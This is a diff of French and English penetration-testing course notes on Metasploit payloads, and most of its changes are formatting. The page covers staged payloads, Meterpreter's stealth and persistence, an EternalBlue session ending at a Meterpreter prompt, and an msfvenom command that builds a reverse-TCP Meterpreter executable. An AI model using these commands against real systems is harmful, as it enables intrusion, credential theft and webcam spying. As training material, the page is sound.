@@ -2,7 +2,13 @@
 
 ***
 
-<mark style="color:orange;">**Définition de Payload :**</mark>  Un **payload** dans Metasploit est un module qui accompagne l'exploit pour permettre à l'attaquant d'obtenir un shell sur la machine cible. Le payload est envoyé avec l'exploit pour contourner le fonctionnement normal du service vulnérable et s'exécute sur le système d'exploitation cible pour généralement établir une connexion inverse avec l'attaquant, permettant ainsi de prendre pied sur le système.
+<mark style="color:orange;">**Définition de Payload**</mark>&#x20;
+
+Un **payload** dans Metasploit est un module qui accompagne l'exploit pour permettre à l'attaquant d'obtenir un shell sur la machine cible.&#x20;
+
+Le payload est envoyé avec l'exploit pour contourner le fonctionnement normal du service vulnérable et s'exécute sur le système d'exploitation cible pour généralement établir une connexion inverse avec l'attaquant, permettant ainsi de prendre pied sur le système.
+
+***
 
 ## <mark style="color:red;">**Types de Payloads dans Metasploit :**</mark>
 
@@ -36,13 +42,19 @@ msf6 > show payloads
 ```
 {% endcode %}
 
-Le code du **Stage 0** a également pour objectif de charger en mémoire une charge utile plus grande lorsqu'elle arrive. Une fois qu'un canal de communication stable est établi entre l'attaquant et la victime, la machine de l'attaquant enverra très probablement une charge utile encore plus volumineuse, qui devrait lui donner un accès shell. Cette charge utile plus grande correspond au **Stage 1**. Nous aborderons cela plus en détail dans les sections suivantes.
+Le code du **Stage 0** a également pour objectif de charger en mémoire une charge utile plus grande lorsqu'elle arrive.&#x20;
+
+Une fois qu'un canal de communication stable est établi entre l'attaquant et la victime, la machine de l'attaquant enverra très probablement une charge utile encore plus volumineuse, qui devrait lui donner un accès shell.&#x20;
+
+Cette charge utile plus grande correspond au **Stage 1**. Nous aborderons cela plus en détail dans les sections suivantes.
 
 ***
 
 <mark style="color:green;">**Meterpreter Payload**</mark>
 
-La charge utile **Meterpreter** est un type spécifique de charge utile multifonctionnelle qui utilise l'**injection de DLL** pour garantir que la connexion avec l'hôte victime est stable, difficile à détecter par des vérifications simples et **persistante** même après un redémarrage ou des modifications du système. Meterpreter s'exécute entièrement en **mémoire** sur l'hôte distant et ne laisse aucune trace sur le disque dur, ce qui le rend très difficile à détecter avec les techniques forensiques conventionnelles. De plus, des scripts et des plugins peuvent être chargés et déchargés dynamiquement selon les besoins.
+La charge utile **Meterpreter** est un type spécifique de charge utile multifonctionnelle qui utilise l'**injection de DLL** pour garantir que la connexion avec l'hôte victime est stable, difficile à détecter par des vérifications simples et **persistante** même après un redémarrage ou des modifications du système.&#x20;
+
+Meterpreter s'exécute entièrement en **mémoire** sur l'hôte distant et ne laisse aucune trace sur le disque dur, ce qui le rend très difficile à détecter avec les techniques forensiques conventionnelles. De plus, des scripts et des plugins peuvent être chargés et déchargés dynamiquement selon les besoins.
 
 Une fois la charge utile **Meterpreter** exécutée, une **nouvelle session** est créée, lançant ainsi l'**interface Meterpreter**. Cette interface est très similaire à celle de **msfconsole**, mais toutes les commandes disponibles sont destinées au **système cible** qui a été "infecté" par la charge utile.&#x20;
 
@@ -54,19 +66,16 @@ Avec **Meterpreter**, nous pouvons également **charger différents plugins** po
 
 ## <mark style="color:red;">Searching for Payloads</mark>
 
-Pour choisir notre premier payload, nous devons savoir ce que nous voulons faire sur la machine cible. Par exemple, si nous souhaitons maintenir un accès persistant, il est probable que nous choisissions un payload Meterpreter.
+Pour choisir notre premier payload, nous devons savoir ce que nous voulons faire sur la machine cible.&#x20;
 
-&#x20;Combinant avec des plugins tels que le plugin Mimikatz de GentilKiwi, tout en maintenant une évaluation organisée et efficace en termes de temps.
+* Par exemple, si nous souhaitons maintenir un accès persistant, il est probable que nous choisissions un payload Meterpreter.
+* Combinant avec des plugins tels que le plugin Mimikatz de GentilKiwi, tout en maintenant une évaluation organisée et efficace en termes de temps.
 
 <mark style="color:green;">**MSF - List Payloads**</mark>
 
 {% code fullWidth="true" %}
 ```shell-session
 msf6 > show payloads
-
-Payloads
-========
-
    #    Name                                                Disclosure Date  Rank    Check  Description
 -    ----                                                ---------------  ----    -----  -----------
    0    aix/ppc/shell_bind_tcp                                               manual  No     AIX Command Shell, Bind TCP Inline
@@ -225,7 +234,7 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > run
 
 The prompt is not a Windows command-line one but a `Meterpreter` prompt. The `whoami` command, typically used for Windows, does not work here. Instead, we can use the Linux equivalent of `getuid`. Exploring the `help` menu gives us further insight into what Meterpreter payloads are capable of.
 
-**MSF - Meterpreter Commands**
+<mark style="color:green;">**MSF - Meterpreter Commands**</mark>
 
 ```shell-session
 meterpreter > help
@@ -234,7 +243,9 @@ Core Commands
 =============
 ```
 
-Pretty nifty. From extracting user hashes from SAM to taking screenshots and activating webcams. All of this is done from the comfort of a Linux-style command line. Exploring further, we also see the option to open a shell channel. This will place us in the actual Windows command-line interface.
+Pretty nifty. From extracting user hashes from SAM to taking screenshots and activating webcams.&#x20;
+
+All of this is done from the comfort of a Linux-style command line. Exploring further, we also see the option to open a shell channel. This will place us in the actual Windows command-line interface.
 
 <mark style="color:green;">**MSF - Meterpreter Navigation**</mark>
 
@@ -268,8 +279,6 @@ Copyright (c) 2009 Microsoft Corporation. All rights reserved.
 C:\Users>dir
 ```
 
-Let's see what other types of payloads we can use. We will be looking at the most common ones related to Windows operating systems.
-
 ***
 
 ## <mark style="color:red;">Payload Types</mark>
@@ -279,7 +288,7 @@ Let's see what other types of payloads we can use. We will be looking at the mos
 Other critical payloads that are heavily used by penetration testers during security assessments are Empire and Cobalt Strike payloads.&#x20;
 
 {% hint style="info" %}
-**"personnaliser nos payloads"** signifie que l’on peut créer des charges utiles (payloads) adaptées aux besoins spécifiques de l'attaque ou de la cible. Voici ce que cela implique et comment cela fonctionne avec _msfvenom_ :
+**"personnaliser nos payloads"** signifie que l’on peut créer des charges utiles (payloads) adaptées aux besoins spécifiques de l'attaque ou de la cible. Voici ce que cela implique et comment cela fonctionne avec _msfvenom_&#x20;
 
 1. **Utilisation de msfvenom :**\
    &#xNAN;_&#x6D;sfvenom_ est un outil de Metasploit qui permet de créer des payloads personnalisés. Avec _msfvenom_, vous pouvez spécifier les options exactes du payload :
@@ -295,15 +304,11 @@ Other critical payloads that are heavily used by penetration testers during secu
 3.  **Exemple de personnalisation avec msfvenom :**\
     Supposons que l’on veuille un payload _Meterpreter_ qui se connecte en _reverse TCP_ sur une machine attaquante avec une IP `192.168.1.10` et un port `4444`. On pourrait générer ce payload avec cette commande _msfvenom_ :
 
-    {% code overflow="wrap" fullWidth="true" %}
-    ```bash
-    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe
-    ```
-    {% endcode %}
+    <pre class="language-bash" data-overflow="wrap" data-full-width="true"><code class="lang-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe
+    </code></pre>
 
     * Ici, `-p` spécifie le type de payload,
     * `LHOST` et `LPORT` définissent l’adresse IP et le port de l’attaquant,
     * `-f` spécifie le format (ici, un fichier exécutable pour Windows),
     * `-o` permet de nommer le fichier final.
 {% endhint %}
-
